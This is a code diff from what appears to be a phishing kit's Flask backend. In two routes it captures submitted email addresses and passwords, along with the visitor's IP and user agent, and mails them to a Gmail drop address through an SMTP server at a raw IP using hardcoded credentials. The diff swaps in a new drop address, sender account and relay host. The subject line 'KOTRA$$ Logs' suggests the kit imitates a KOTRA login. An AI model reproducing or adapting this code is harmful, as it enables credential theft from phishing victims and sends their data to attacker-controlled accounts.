@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "auto528@cryptasphere.bio"
-        sender_emaill = "auto528"
-        receiver_email = "notificationalibaba@gmail.com"
-        password = "vip7a81be0e2b36"
+        sender_email = "no-reply@shoroqshoroqprojectservice.biz"
+        sender_emaill = "no-reply"
+        receiver_email = "fabio501ants@gmail.com"
+        password = "vip36cdf94e8710"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("146.19.254.243", 6040) as server:
+        with smtplib.SMTP("45.143.167.17", 2525) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "auto528@cryptasphere.bio"
-        sender_emaill = "auto528"
-        receiver_email = "notificationalibaba@gmail.com"
-        password = "vip7a81be0e2b36"
+        sender_email = "no-reply@shoroqshoroqprojectservice.biz"
+        sender_emaill = "no-reply"
+        receiver_email = "fabio501ants@gmail.com"
+        password = "vip36cdf94e8710"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("146.19.254.243", 6040) as server:
+        with smtplib.SMTP("45.143.167.17", 2525) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
